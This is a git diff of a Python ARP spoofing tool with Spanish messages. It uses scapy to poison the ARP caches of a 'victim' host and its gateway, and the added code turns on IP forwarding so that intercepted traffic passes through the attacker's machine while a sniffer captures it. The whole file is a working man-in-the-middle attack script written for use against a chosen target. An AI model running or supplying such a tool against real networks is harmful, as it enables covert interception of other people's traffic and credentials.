@@ -1,7 +1,26 @@
 import sys
+import argparse
 import os
 import scapy.all as scapy
 import time
+def enable_disable_linux_route():
+        path = '/proc/sys/net/ipv4/ip_forward'
+        with open(path) as f:
+                if f.read() == 1:
+                        return
+        with open(path, "w") as f:
+                print(1, file=f)
+def enable_windows_iprouter():
+        from services import WService
+        servicio = WService("RemoteAcess")
+        servicio.start()
+def control_de_forwarding(verbose=True):
+        if verbose:
+                print ("[!] Habilitando Routing IP ")
+        enable_windows_iprouter() if "nt" in os.name else enable_disable_linux_route()
+        if verbose:
+                print ("Routing IP habilitado para su host")
+
 def fallo(ip1,ip2):
     
         print ("La maquina victima no esta generando trafico\n")
@@ -34,33 +53,37 @@ def restaurartablas(ip_destino, ip_origen):
 
         scapy.send(paquete, verbose = False)
 
-ip_objetivo = sys.argv[1]
-gateway_ip = sys.argv[2]
+
 print ("Ejecuta el programa de la siguiente manera poniendo como primer argumento la ip victima y como segundo la ip de la puerta de enlace o gateway de su red: sudo python3 arpspoofing.py 192.168.0.10 192.168.1.1")
-if len(sys.argv[1]) < 10 or len(sys.argv[2]) < 10:
-    print ("Ha introducido mal los parametros")
-    
-try:  
-    paquetes_enviados = 0
+if __name__ == '__main__':
+        parser = argparse.ArgumentParser(description="arpspoofing by luijait")
+        parser.add_argument("ip_objetivo", help="Host Victima")
+        parser.add_argument("gateway_ip", help="Gateway")
+        parser.add_argument("-v", "--verbose", action="store_true", help="habilitar verbose")
+        args = parser.parse_args()
+        ip_objetivo, gateway_ip, verbose = args.ip_objetivo, args.gateway_ip, args.verbose
+        control_de_forwarding()
+        try:  
+                paquetes_enviados = 0
 
-    while True:
+                while True:
 
-        spoofeo(ip_objetivo, gateway_ip)
+                        spoofeo(ip_objetivo, gateway_ip)
 
-        spoofeo(gateway_ip, ip_objetivo)
+                        spoofeo(gateway_ip, ip_objetivo)
 
-        paquetes_enviados = paquetes_enviados + 2
+                        paquetes_enviados = paquetes_enviados + 2
 
-        print("\r[*]Se esta arpeando el objetivo... ahora use su sniffer la cantidad de paquetes enviados son:" +str(paquetes_enviados), end="")
+                        print("\r[*]Se esta arpeando el objetivo... ahora use su sniffer la cantidad de paquetes enviados son:" +str(paquetes_enviados), end="")
 
-        time.sleep(2)
+                        time.sleep(2)
           
                 
             
-except IndexError:
-           fallo(ip_objetivo, gateway_ip)
-except KeyboardInterrupt:
-      print("\n Ha parado el programa.... Resteando tablas ARP del objetivo")
-      restaurartablas(gateway_ip, ip_objetivo)
-      restaurartablas(ip_objetivo, gateway_ip)
-      print("Ha salido del programa")
+        except IndexError:
+                fallo(ip_objetivo, gateway_ip)
+        except KeyboardInterrupt:
+                print("\n Ha parado el programa.... Resteando tablas ARP del objetivo")
+                restaurartablas(gateway_ip, ip_objetivo)
+                restaurartablas(ip_objetivo, gateway_ip)
+                print("Ha salido del programa")
